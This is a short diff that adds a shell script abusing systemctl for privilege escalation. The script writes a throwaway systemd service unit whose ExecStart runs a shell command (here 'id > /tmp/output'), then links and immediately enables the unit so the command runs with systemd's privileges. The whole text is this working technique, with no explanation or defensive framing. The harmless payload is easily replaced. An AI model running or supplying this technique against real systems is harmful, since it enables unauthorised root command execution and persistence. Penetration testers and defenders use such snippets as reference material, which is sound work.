@@ -1,0 +1,8 @@
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
